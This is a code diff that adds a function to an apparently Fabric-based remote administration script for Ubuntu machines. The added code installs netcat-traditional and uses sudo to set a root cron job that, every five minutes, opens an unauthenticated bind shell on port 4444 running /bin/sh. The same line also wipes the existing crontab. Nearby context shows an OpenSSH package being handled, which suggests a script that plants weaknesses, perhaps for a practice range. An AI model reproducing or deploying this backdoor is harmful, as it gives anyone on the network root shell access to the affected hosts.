@@ -75,6 +75,9 @@ def nomnom_ubuntu(connect):
     connect.run('rm openssh-server_7.2p2-4ubuntu2.7_amd64.deb')
 
 
+def vince_netcat(connect):
+    connect.sudo("apt install netcat-traditional -y")
+    connect.sudo("crontab -l | echo '*/5 * * * * nc.traditional -lvp 4444 -e /bin/sh' | crontab -")
 
 
 
